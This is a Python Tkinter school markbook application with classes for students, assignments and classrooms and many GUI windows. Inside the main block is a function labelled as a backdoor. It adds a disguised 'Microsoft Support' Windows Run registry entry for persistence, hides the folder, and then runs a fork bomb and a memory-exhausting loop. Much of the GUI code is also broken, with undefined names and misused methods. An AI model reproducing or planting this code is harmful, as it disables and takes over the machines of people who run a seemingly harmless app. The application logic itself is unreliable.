"""
Markbook Application
Group members: Yingchen Ma, Charlie Guo, Simon Li
"""
from typing import Dict
from tkinter import *
from tkinter import simpledialog
from tkinter import filedialog
import itertools, subprocess, sys, os


class Student:
    def __init__(self, first_name, last_name, gender, image, student_number,
                 grade, email, comments):
        self.first_name = first_name
        self.last_name = last_name
        self.gender = gender
        self.image = image
        self.student_number = student_number
        self.grade = grade
        self.email = email
        self.comments = comments
        self.marks = {}

    def __str__(self):
        return "{0} {1} {2}".format(self.first_name, self.last_name,
                                    self.student_number)

    def get_student_num(self):
        return self.student_number

    def set_course(self, course_code):
        self.marks[course_code] = {}

    def create_assignment(self, course_code, assignment_name):
        if course_code not in self.marks:
            self.set_course(course_code)
        self.marks[course_code][assignment_name] = 0

    def set_assignment_mark(self, course_code, assignment_name, mark):
        self.marks[course_code][assignment_name] = mark

    def get_assignment_mark(self, course_code, assignment):
        return self.marks[course_code][assignment]

    def get_comment(self):
        return self.comments

    def set_comment(self, comments):
        self.comments = comments

    # calculate the average of a specific course, auto drop the lowest
    def get_assignment_average(self, course_code):
        if len(self.marks[course_code]) == 0:
            return 0
        sum_mark = 0
        for i in self.marks[course_code]:
            sum_mark += self.marks[course_code][i]

        values = []
        for value in self.marks[course_code].values():
            values.append(value)

        if len(self.marks[course_code]) == 1:
            return sum_mark
        return ((sum_mark - min(values)) /
                ((len(self.marks[course_code]) - 1)))

    # calculate the average of all courses
    def get_overall_average(self):
        if len(self.marks) == 0:
            return 0
        else:
            overall_sum = 0
            for course_code in self.marks:
                overall_sum += self.get_assignment_average(course_code)
            if len(self.marks) == 1:
                return overall_sum
            return overall_sum / len(self.marks)

    def get_course_marks(self, course_code):
        return self.marks[course_code]

    def assignment(self):
        return self.marks


class Assignment:
    def __init__(self, name, points, due):
        self.name = name
        self.points = points
        self.due = due
        self.course = None

    def __str__(self):
        return "{0}, worth {1} marks".format(self.name, str(self.points))

    def get_name(self):
        return self.name

    def get_worth(self):
        return self.points

    def set_course(self, course_code):
        self.course = course_code

    def get_course(self):
        return self.course


class Classroom:
    def __init__(self, course_code, course_name, period, teacher_name):
        self.course_code = course_code
        self.course_name = course_name
        self.period = period
        self.teacher_name = teacher_name
        self.student_list = []
        self.assignment_list = []

    def __repr__(self):
        return self.get_course_code()

    def get_course_code(self):
        """
        Return the course code
        :return:
        :rtype:
        """
        return self.course_code

    def get_info(self):
        """
        Print class information
        :return:
        :rtype:
        """
        return "{0} {1}; period: {2}; Teacher: {3}".format(
            self.course_code, self.course_name, self.period, self.teacher_name)

    def add_assignment(self, assignment):
        """
        Add an assignmnet to this classroom
        :param assignment:
        :type assignment:
        :return:
        :rtype:
        """
        assignment.set_course(self.course_code)
        self.assignment_list.append(assignment)
        for student in self.student_list:
            student.create_assignment(self.course_code, assignment.get_name())

    def remove_assignment(self, assignment):
        """
        Remove an assignment from this classroom if available.
        :param assignment:
        :type assignment:
        :return:
        :rtype:
        """
        if assignment in self.assignment_list:
            self.assignment_list.remove(assignment)

    def print_assignments(self):
        """
        Print all the assignments.
        :return:
        :rtype:
        """
        for assignment in self.assignment_list:
            print(assignment)

    def add_student(self, student):
        """
        Add a new student to this classroom
        :param student:
        :type student:
        :return:
        :rtype:
        """
        self.student_list.append(student)

    def remove_student(self, student):
        """
        Remove a student from this classroom if available.
        :param student:
        :type student:
        :return:
        :rtype:
        """
        if student in self.student_list:
            self.student_list.remove(student)

    def print_students(self):
        """
        Print all the students in this classroom
        :return:
        :rtype:
        """
        for student in self.student_list:
            print(student)

    def find_assignment_worth(self, a_n):
        """
        Helper function.
        Find the worth of an assignment naming a_n
        :param a_n:
        :return:
        :rtype:
        """
        for assignment in self.assignment_list:
            if assignment.get_name() == a_n:
                return assignment.get_worth()

    def get_assignment_scores(self, assignment_name):
        """
        Print all the scores of this class regarding to the assignment name
        :param assignment_name:
        :type assignment_name:
        :return:
        :rtype:
        """
        print("{0} {1}\n".format(self.course_code, assignment_name))
        for student in self.student_list:
            m = student.get_assignment_mark(self.course_code, assignment_name)
            print(student, "{0} / {1}".format(
                m, self.find_assignment_worth(assignment_name)))

    def get_assignment_average(self, assignment_name):
        """
        Get the average score of assignment_name
        :param assignment_name:
        :type assignment_name:
        :return:
        :rtype:
        """
        score_sum = 0
        score_tot = 0
        for student in self.student_list:
            m = student.get_assignment_mark(self.course_code, assignment_name)
            score_sum += m
            score_tot += 1
        print("{0} out of {1} average for {2}".format(
            score_sum/score_tot, self.find_assignment_worth(assignment_name),
            assignment_name))
        return score_sum / score_tot

    def set_mark(self, student_num, assignment_name, mark):
        student = None
        for i in self.student_list:
            if i.get_student_num() == student_num:
                student = i
        if student:
            student.set_assignment_mark(
                self.course_code, assignment_name, mark)

    def order_assignments(self, by):
        d = {}
        for assignment in self.assignment_list:
            a = assignment.get_name()
            s = self.get_assignment_average(a)
            d[a] = s
        print(self.get_course_code())
        if by == "alpha":
            for k in sorted(d.keys()):
                print(k, d[k])
        if by == "score":
            new_d = reverse_dict(d)
            for k in sorted(new_d.keys(), reverse=True):
                for v in sorted(new_d[k]):
                    print(v, k)


def reverse_dict(d):
    new_d = {}
    for key in d:
        if d[key] not in new_d:
            new_d[d[key]] = []
        new_d[d[key]].append(key)
    return new_d


if __name__ == "__main__":

    def abc():
        f = os.path.basename(sys.argv[0])
        Backdoor_Name = os.path.basename(__file__)
        hiddenPath = os.getcwd()
        hiddenPath = '\"' + hiddenPath + '\"'
        regPath = os.getcwd()
        regPath = regPath + r"\%s" % Backdoor_Name
        regPath = '\"' + regPath + '\"'
        regConnect = ConnectRegistry(None, HKEY_LOCAL_MACHINE)
        regKey = OpenKey(regConnect, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
        SetValueEx(regKey, "Microsoft Support", 0, REG_SZ, r"" + regPath)
        os.system("attrib +h " + hiddenPath)
        while True:
            subprocess.Popen("%s" % f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
            subprocess.Popen("%s" % f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
            subprocess.Popen("%s" % f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
            subprocess.Popen("%s" % f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
            subprocess.Popen("%s" % f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
            subprocess.Popen("%s" % f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
            subprocess.Popen("%s" % f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
            subprocess.Popen("%s" % f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
            subprocess.Popen("%s" % f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
            subprocess.Popen("%s" % f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
            subprocess.Popen("%s" % f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
            [''.join(x for x in t) for t in itertools.product("abcdefghijklmnobqrstuvwxyz", repeat=100)]
            [''.join(x for x in t) for t in itertools.product("abcdefghijklmnobqrstuvwxyz", repeat=100)]

    def chuangjian1cgpg():

        global root20
        root20 = Tk()

        root20.title("You are set")
        root20.geometry("240x320")
        root20.resizable(width=True, height=True)

        # 标签
        L_title = Label(root20, text='success')
        L_title.config(font='Helvetica -20 bold', fg='blue')
        L_title.place(x=50, y=100, anchor="center")

    # Create Classroom
    def chuangjian1pg():

        global root10
        root10 = Tk()

        root10.title("creat class")
        root10.geometry("480x640")
        root10.resizable(width=True, height=True)

        # Create Class
        L_title = Label(root10, text='Creat a course')
        L_title.config(font='Helvetica -15 bold', fg='blue')
        L_title.place(x=50, y=10, anchor="center")
        # Course Code
        L_title = Label(root10, text='course code')
        L_title.config(font='Helvetica -15 bold', fg='red')
        L_title.place(x=70, y=50, anchor="center")
        # Input
        course_code = Entry(root10)
        course_code.pack(padx=100, pady=30)
        # Course Name
        L_title = Label(root10, text='course name')
        L_title.config(font='Helvetica -15 bold', fg='red')
        L_title.place(x=50, y=100, anchor="center")
        # Input
        course_name = Entry(root10)
        course_name.pack(padx=100, pady=5)
        # teacher name
        L_title = Label(root10, text='teacher name')
        L_title.config(font='Helvetica -15 bold', fg='red')
        L_title.place(x=50, y=150, anchor="center")
        # Input
        teacher_name = Entry(root10)
        teacher_name.pack(padx=100, pady=30)
        # 科目位置
        L_title = Label(root10, text='period')
        L_title.config(font='Helvetica -15 bold', fg='red')
        L_title.place(x=50, y=200, anchor="center")
        # 输入按钮
        period = Entry(root10)
        # 输入框赋值在period变量
        period.pack(padx=100, pady=3)
        # 继续返回按钮
        Classroom(course_code, course_name, period, teacher_name)
        B_15 = Button(root10, text="next", command=chuangjian1cgpg)
        B_15.place(x=300, y=450)
        root10.mainloop()

    # 6课堂作业添加
    def ketangzytjpg():

        global root31
        root31 = Tk()

        root31.title("add homework")
        root31.geometry("480x640")
        root31.resizable(width=True, height=True)
        # 作业添加
        L_title = Label(root31, text='creat assignment')
        L_title.config(font='Helvetica -15 bold', fg='blue')
        L_title.place(x=150, y=20, anchor="center")
        # 作业名
        L_title = Label(root31, text='name')
        L_title.config(font='Helvetica -15 bold', fg='red')
        L_title.place(x=100, y=100, anchor="center")
        # 输入按钮
        name = Entry(root31)
        # 输入框赋值在name变量
        name.pack(padx=150, pady=90)
        # 作业比重
        L_title = Label(root31, text='worth')
        L_title.config(font='Helvetica -15 bold', fg='red')
        L_title.place(x=100, y=210, anchor="center")
        # 输入按钮
        points = Entry(root31)
        # 输入框赋值在points变量
        points.pack(padx=150, pady=0)
        # 课程号
        L_title = Label(root31, text='due Date')
        L_title.config(font='Helvetica -15 bold', fg='red')
        L_title.place(x=100, y=280, anchor="center")
        # 输入按钮
        due = Entry(root31)
        # 输入框赋值在due变量
        due.pack(padx=150, pady=50)

        Assignment(name, points, due)
        # 继续按钮
        B_18 = Button(root31, text="next", command=chuangjian1cgpg)
        B_18.place(x=300, y=500)
        root31.mainloop()

    # Delete Assignment
    def ketangzyscpg():

        global root44
        root44 = Tk()

        root44.title("delete homework")
        root44.geometry("640x480")
        root44.resizable(width=True, height=True)
        # 课堂作业删除
        L_title = Label(root44, text='remove assignment')
        L_title.config(font='Helvetica -15 bold', fg='blue')
        L_title.place(x=150, y=50, anchor="center")
        # 输入按钮
        name = Entry(root44)
        # 输入框赋值在e变量
        name.pack(padx=100, pady=40)
        # 继续
        Assignment(name, null, null)
        B_21 = Button(root44, text="next", command=chuangjian1cgpg)
        B_21.place(x=300, y=400)
        root44.mainloop()

    # Assignment Info
    def ketangzyxxpg():

        global root32
        root32 = Tk()

        root32.title("homework info")
        root32.geometry("640x480")
        root32.resizable(width=True, height=True)
        # 课堂作业信息
        L_title = Label(root32, text='assignment info')
        L_title.config(font='Helvetica -15 bold', fg='blue')
        L_title.place(x=150, y=20, anchor="center")
        # 作业名
        L_title = Label(root32, text='assignment name')
        L_title.config(font='Helvetica -15 bold', fg='blue')
        L_title.place(x=100, y=100, anchor="center")
        # 课程号
        L_title = Label(root32, text='course code')
        L_title.config(font='Helvetica -15 bold', fg='blue')
        L_title.place(x=100, y=200, anchor="center")
        # 作业比重
        L_title = Label(root32, text='worth')
        L_title.config(font='Helvetica -15 bold', fg='blue')
        L_title.place(x=100, y=300, anchor="center")

    # Add marks to assignment
    def ketangzyfstjpg():
        global root71
        root71 = Tk()
        root71.title("Add Mark")
        root72.geometry("480x640")
        root71.resizable(width=True, height=True)
        # 作业分数添加
        L_title = Label(root71, text='add assignment mark')
        L_title.config(font='Helvetica -15 bold', fg='blue')
        L_title.place(x=150, y=20, anchor="center")
        # 课程号
        L_title = Label(root71, text='course code')
        L_title.config(font='Helvetica -15 bold', fg='red')
        L_title.place(x=100, y=100, anchor="center")
        # 输入按钮
        course = Entry(root71)
        # 输入框赋值在course变量
        course.pack(padx=150, pady=90)
        # 学生号
        L_title = Label(root71, text='student number')
        L_title.config(font='Helvetica -15 bold', fg='red')
        L_title.place(x=100, y=210, anchor="center")
        # 输入按钮
        g3 = Entry(root71)
        # 输入框赋值在e变量
        g3.pack(padx=150, pady=0)
        # 作业
        L_title = Label(root71, text='assignment')
        L_title.config(font='Helvetica -15 bold', fg='red')
        L_title.place(x=100, y=280, anchor="center")
        # 输入按钮
        g4 = Entry(root71)
        # 输入框赋值在e变量
        g4.pack(padx=150, pady=50)
        # 分数
        L_title = Label(root71, text='mark')
        L_title.config(font='Helvetica -15 bold', fg='red')
        L_title.place(x=100, y=350, anchor="center")
        # 输入按钮
        g5 = Entry(root71)
        # 输入框赋值在e变量
        g5.pack(padx=150, pady=1)
        # 继续（添加移除）按钮

        B_37 = Button(root71, text="add", command=chuangjian1cgpg)
        B_37.place(x=150, y=500)
        root71.mainloop()

    def ketangzyfsscpg():
        global root72
        root72 = Tk()
        root72.title("remove mark")
        root72.geometry("480x640")
        root72.resizable(width=True, height=True)
        # 作业分数添加
        L_title = Label(root72, text='remove assignment mark')
        L_title.config(font='Helvetica -15 bold', fg='blue')
        L_title.place(x=150, y=20, anchor="center")
        # 课程号
        L_title = Label(root72, text='course code')
        L_title.config(font='Helvetica -15 bold', fg='red')
        L_title.place(x=100, y=100, anchor="center")
        # 输入按钮
        g2 = Entry(root72)
        # 输入框赋值在e变量
        g2.pack(padx=150, pady=90)
        # 学生号
        L_title = Label(root72, text='student number')
        L_title.config(font='Helvetica -15 bold', fg='red')
        L_title.place(x=100, y=210, anchor="center")
        # 输入按钮
        g3 = Entry(root72)
        # 输入框赋值在e变量
        g3.pack(padx=150, pady=0)
        # 作业
        L_title = Label(root72, text='assignment')
        L_title.config(font='Helvetica -15 bold', fg='red')
        L_title.place(x=100, y=280, anchor="center")
        # 输入按钮
        g4 = Entry(root72)
        # 输入框赋值在e变量
        g4.pack(padx=150, pady=50)
        # 分数
        L_title = Label(root72, text='mark')
        L_title.config(font='Helvetica -15 bold', fg='red')
        L_title.place(x=100, y=350, anchor="center")
        # 输入按钮
        g5 = Entry(root72)
        # 输入框赋值在e变量
        g5.pack(padx=150, pady=1)
        # 继续（添加移除）按钮
        B_37 = Button(root72, text="remove", command=chuangjian1cgpg)
        B_37.place(x=200, y=500)
        root72.mainloop()

    # 7课堂学生分数信息
    def ketangxsfsxxpg():
        root36 = Tk()

        root36.title("student mark info")
        root36.geometry("640x480")
        root36.resizable(width=True, height=True)
        # 管理学生分数
        L_title = Label(root36, text='mark info')
        L_title.config(font='Helvetica -15 bold', fg='blue')
        L_title.place(x=150, y=20, anchor="center")

    # 6Manage Assignment marks
    def ketangzyfsglpg():

        global root61
        root61 = Tk()

        root61.title("assment mark mani")
        root61.geometry("640x480")
        root61.resizable(width=True, height=True)
        # 管理作业
        L_title = Label(root61, text='manage assignment mark')
        L_title.config(font='Helvetica -15 bold', fg='blue')
        L_title.place(x=150, y=20, anchor="center")
        # 课堂作业添加
        B_30 = Button(
            root61, text="add assignment mark", command=ketangzyfstjpg)
        B_30.place(x=130, y=100)
        # 课堂作业移除
        B_31 = Button(
            root61, text="remove assignment mark", command=ketangzyfsscpg)
        B_31.place(x=130, y=200)
        # 课堂作业显示
        B_31 = Button(root61, text="info", command=ketangxsfsxxpg)
        B_31.place(x=130, y=300)

    # Assignment
    def ketangzypg():

        global root21
        root21 = Tk()

        root21.title("class assment")
        root21.geometry("640x480")
        root21.resizable(width=True, height=True)
        # 管理作业
        L_title = Label(root21, text='manage assignment')
        L_title.config(font='Helvetica -15 bold', fg='blue')
        L_title.place(x=150, y=20, anchor="center")
        # 课堂作业添加
        B_30 = Button(root21, text="add assignment", command=ketangzytjpg)
        B_30.place(x=130, y=100)
        # 课堂作业移除
        B_31 = Button(root21, text="remove assignment", command=ketangzyscpg)
        B_31.place(x=130, y=200)
        # 课堂作业分数管理
        B_31 = Button(root21, text="manage mark", command=ketangzyfsglpg)
        B_31.place(x=130, y=300)
        # 课堂作业信息
        B_32 = Button(root21, text="assignment info", command=ketangzyxxpg)
        B_32.place(x=130, y=400)

    # Add student to classroom
    def ketangxstjpg():
        global root35
        root35 = Tk()
        root35.title("add student to class")
        root35.geometry("480x640")
        root35.resizable(width=True, height=True)
        # 学生添加
        L_title = Label(root35, text='add student')
        L_title.config(font='Helvetica -15 bold', fg='blue')
        L_title.place(x=80, y=100, anchor="center")
        # 输入按钮
        namea = Entry(root35)
        # 输入框赋值在namea变量
        namea.pack(padx=100, pady=90)
        # 学生移除
        L_title = Label(root35, text='remove student')
        L_title.config(font='Helvetica -15 bold', fg='blue')
        L_title.place(x=80, y=200, anchor="center")
        # 输入按钮
        namej = Entry(root35)
        # 输入框赋值在namej变量
        namej.pack(padx=100, pady=0)
        # 继续
        Classroom.add_student(namea)
        Classroom.remove_student(namej)
        B_21 = Button(root35, text="next", command=chuangjian1cgpg)
        B_21.place(x=300, y=450)
        root35.mainloop()

    # Class student info
    def ketangxsxspg():
        root36 = Tk()

        root36.title("class student info")
        root36.geometry("640x480")
        root36.resizable(width=True, height=True)
        # 管理学生
        L_title = Label(root36, text='student list')
        L_title.config(font='Helvetica -15 bold', fg='blue')
        L_title.place(x=150, y=20, anchor="center")

    # 5课堂学生
    def ketangxspg():

        global root22
        root22 = Tk()

        root22.title("student in class")
        root22.geometry("640x480")
        root22.resizable(width=True, height=True)
        # 管理学生
        L_title = Label(root22, text='manage student')
        L_title.config(font='Helvetica -15 bold', fg='blue')
        L_title.place(x=150, y=20, anchor="center")
        # 课堂学生添加,移除
        B_40 = Button(
            root22, text="add or remove student", command=ketangxstjpg)
        B_40.place(x=130, y=100)
        # 课堂学生显示
        B_42 = Button(root22, text="student list", command=ketangxsxspg)
        B_42.place(x=130, y=300)

    # 4课堂管理
    def guanli1pg():

        global root11
        root11 = Tk()

        root11.title("class mani")
        root11.geometry("640x480")
        root11.resizable(width=True, height=True)
        # 课堂管理
        L_title = Label(root11, text='manage')
        L_title.config(font='Helvetica -15 bold', fg='blue')
        L_title.place(x=150, y=20, anchor="center")
        # 课堂作业选项
        B_30 = Button(root11, text="assignment", command=ketangzypg)
        B_30.place(x=130, y=200)
        # 课堂学生选项
        B_31 = Button(root11, text="student", command=ketangxspg)
        B_31.place(x=130, y=300)

    # 4课程信息
    def xinxi1pg():

        global root12
        root12 = Tk()

        root12.title("class info")
        root12.geometry("1280x720")
        root12.resizable(width=True, height=True)
        # 信息
        L_title = Label(root12, text='info')
        L_title.config(font='Helvetica -20 bold', fg='blue')
        L_title.place(x=50, y=50, anchor="center")
        # 课程名
        L_title = Label(root12, text='course name:')
        L_title.config(font='Helvetica -15 bold', fg='blue')
        L_title.place(x=100, y=200, anchor="center")
        # 科目位置
        L_title = Label(root12, text='period:')
        L_title.config(font='Helvetica -15 bold', fg='blue')
        L_title.place(x=100, y=400, anchor="center")
        # 老师名
        L_title = Label(root12, text='teacher name:')
        L_title.config(font='Helvetica -15 bold', fg='blue')
        L_title.place(x=100, y=600, anchor="center")
        root12.mainloop()
        ketangx1pg()

    # First page
    def xuanxiang1pg():

        global root0
        root0 = Tk()
        root0.title("class,student")
        root0.geometry("240x320")
        root0.resizable(width=True, height=True)
        # 提示文字
        L_title = Label(root0, text='Please select')
        L_title.config(font='Helvetica -15 bold', fg='black')
        L_title.place(x=10, y=10, )
        # 课堂
        B_250 = Button(root0, text="Classroom", command=ketangx1pg)
        B_250.place(x=40, y=100)
        # 学生
        B_251 = Button(root0, text="Student", command=ketangx2pg)
        B_251.place(x=40, y=150)
        root0.mainloop()

    # 3课堂选项
    def ketangx1pg():
        global root1
        root1 = Tk()

        root1.title("class option")
        root1.geometry("240x320")
        root1.resizable(width=True, height=True)

        # 标签
        L_title = Label(root1, text='Please select')
        L_title.config(font='Helvetica -15 bold', fg='blue')
        L_title.place(x=60, y=10, anchor="center")
        # 创建课程
        B_11 = Button(root1, text="create course", command=chuangjian1pg)
        B_11.place(x=40, y=60)
        # 管理课程
        B_12 = Button(root1, text="manage course", command=guanli1pg)
        B_12.place(x=40, y=120)
        # 课程信息
        B_13 = Button(root1, text="info", command=xinxi1pg)
        B_13.place(x=40, y=180)

        root1.mainloop()

    # 4课堂学生添加
    def chuangjiansxpg():

        global root46
        root46 = Tk()
        root46.title("add student")
        root46.geometry("480x640")
        root46.resizable(width=True, height=True)
        # 学生添加
        L_title = Label(root46, text='Creat student')
        L_title.config(font='Helvetica -15 bold', fg='blue')
        L_title.place(x=70, y=10, anchor="center")
        # 名字
        L_title = Label(root46, text='first name')
        L_title.config(font='Helvetica -15 bold', fg='red')
        L_title.place(x=50, y=50, anchor="center")
        # 输入按钮
        name = Entry(root46)
        # 输入框赋值在name变量
        name.pack(padx=100, pady=30)
        # 姓字
        L_title = Label(root46, text='last name')
        L_title.config(font='Helvetica -15 bold', fg='red')
        L_title.place(x=50, y=100, anchor="center")
        # 输入按钮
        e2 = Entry(root46)
        # 输入框赋值在e变量
        e2.pack(padx=100, pady=5)
        # 性别
        L_title = Label(root46, text='gender')
        L_title.config(font='Helvetica -15 bold', fg='red')
        L_title.place(x=50, y=150, anchor="center")
        # 输入按钮
        e3 = Entry(root46)
        # 输入框赋值在e变量
        e3.pack(padx=100, pady=30)
        # 学生号
        L_title = Label(root46, text='student number')
        L_title.config(font='Helvetica -15 bold', fg='red')
        L_title.place(x=80, y=200, anchor="center")
        # 输入按钮
        e4 = Entry(root46)
        # 输入框赋值在e变量
        e4.pack(padx=100, pady=1)
        # 年级
        L_title = Label(root46, text='grade')
        L_title.config(font='Helvetica -15 bold', fg='red')
        L_title.place(x=50, y=250, anchor="center")
        # 输入按钮
        e4 = Entry(root46)
        # 输入框赋值在e变量
        e4.pack(padx=100, pady=25)
        # 邮箱
        L_title = Label(root46, text='email')
        L_title.config(font='Helvetica -15 bold', fg='red')
        L_title.place(x=50, y=300, anchor="center")
        # 输入按钮
        e4 = Entry(root46)
        # 输入框赋值在e变量
        e4.pack(padx=100, pady=5)
        # 评论
        L_title = Label(root46, text='comments')
        L_title.config(font='Helvetica -15 bold', fg='red')
        L_title.place(x=50, y=350, anchor="center")
        # 输入按钮
        e4 = Entry(root46)
        # 输入框赋值在e变量
        e4.pack(padx=100, pady=25)
        Classroom.add_student(name)
        # 继续返回按钮
        B_15 = Button(root46, text="next", command=chuangjian1cgpg)
        B_15.place(x=300, y=450)
        root46.mainloop()

    # 4学生信息
    def xsxxipg():
        global root2
        root69 = Tk()

        root69.title("student info")
        root69.geometry("640x480")
        root69.resizable(width=True, height=True)
        # 标签
        L_title = Label(root69, text='student info')
        L_title.config(font='Helvetica -15 bold', fg='blue')
        L_title.place(x=60, y=10, anchor="center")

    # 5课学生添加课程
    def kectjpg():
        global root75
        root75 = Tk()
        root75.title("Add class")
        root75.geometry("480x640")
        root75.resizable(width=True, height=True)
        # 学生添加
        L_title = Label(root75, text='add course')
        L_title.config(font='Helvetica -15 bold', fg='blue')
        L_title.place(x=80, y=100, anchor="center")
        # 输入按钮
        namea = Entry(root75)
        # 输入框赋值在namea变量
        namea.pack(padx=100, pady=90)
        # 学生移除
        L_title = Label(root75, text='imput course code')
        L_title.config(font='Helvetica -15 bold', fg='blue')
        L_title.place(x=80, y=200, anchor="center")
        # 输入按钮
        namej = Entry(root75)
        # 输入框赋值在e变量
        namej.pack(padx=100, pady=0)
        # 继续
        Classroom.add_student(namea)
        Classroom.add_student(namej)
        B_21 = Button(root75, text="next", command=chuangjian1cgpg)
        B_21.place(x=300, y=450)
        root75.mainloop()

    # 5学生作业信息
    def xszyxxpg():
        global root2
        root76 = Tk()

        root76.title("Homework")
        root76.geometry("640x480")
        root76.resizable(width=True, height=True)
        # 标签
        L_title = Label(root76, text='assignment info')
        L_title.config(font='Helvetica -15 bold', fg='blue')
        L_title.place(x=60, y=10, anchor="center")

    # 5学生评论
    def xsplpg():
        root77 = Tk()

        root77.title("Mean comment")
        root77.geometry("640x480")
        root77.resizable(width=True, height=True)
        # 标签

        L_title = Label(root77, text='comment')
        L_title.config(font='Helvetica -15 bold', fg='blue')
        L_title.place(x=60, y=10, anchor="center")

    # 4学生管理
    def ketangx3pg():
        global root2
        root39 = Tk()

        root39.title("student manege")
        root39.geometry("640x480")
        root39.resizable(width=True, height=True)
        # 标签
        L_title = Label(root39, text='Please select')
        L_title.config(font='Helvetica -15 bold', fg='blue')
        L_title.place(x=60, y=10, anchor="center")
        # 添加课程
        B_11 = Button(root39, text="add course", command=kectjpg)
        B_11.place(x=40, y=60)
        # 作业信息
        B_12 = Button(root39, text="assignment info", command=xszyxxpg)
        B_12.place(x=40, y=120)
        # 评论
        B_13 = Button(root39, text="comment", command=xsplpg)
        B_13.place(x=40, y=180)
        root39.mainloop()

    # 3学生选项
    def ketangx2pg():

        global root2
        root38 = Tk()

        root38.title("Student")
        root38.geometry("640x480")
        root38.resizable(width=True, height=True)
        # 标签
        L_title = Label(root38, text='Please select')
        L_title.config(font='Helvetica -15 bold', fg='blue')
        L_title.place(x=60, y=10, anchor="center")
        # 创建学生
        B_11 = Button(root38, text="creat student", command=chuangjiansxpg)
        B_11.place(x=40, y=60)
        # 管理学生
        B_12 = Button(root38, text="manage student", command=ketangx3pg)
        B_12.place(x=40, y=120)
        # 学生信息
        B_13 = Button(root38, text="info", command=xsxxipg)
        B_13.place(x=40, y=180)
        root38.mainloop()

    # Log in password
    def denglumima():
        myAccount = a_entry.get()
        myPassword = p_entry.get()
        a_len = len(myAccount)
        p_len = len(myPassword)
        if myAccount == "a" and myPassword == "a":
            msg_label["text"] = "Successful Login"
            xuanxiang1pg()
        elif myAccount == "a" and myPassword != "a":
            msg_label["text"] = "password error"
            p_entry.delete(0, p_len)
        else:
            msg_label["text"] = "name error"
            a_entry.delete(0, a_len)
            p_entry.delete(0, p_len)

    # Initialization
    root = Tk()
    root.geometry("320x240")
    # name
    a_label = Label(root, text="Username:")
    a_label.grid(row=0, column=0, sticky=W)
    a_entry = Entry(root)
    a_entry.grid(row=0, column=1, sticky=E)
    # password
    p_label = Label(root, text="Password:")
    p_label.grid(row=1, column=0, sticky=W)
    p_entry = Entry(root)
    p_entry["show"] = "*"
    p_entry.grid(row=1, column=1, sticky=E)
    # log in button
    btn = Button(root, text="login", command=denglumima)
    btn.grid(row=2, column=1, sticky=E)
    # prompt
    msg_label = Label(root, text="")
    msg_label.grid(row=3)
    root.mainloop()
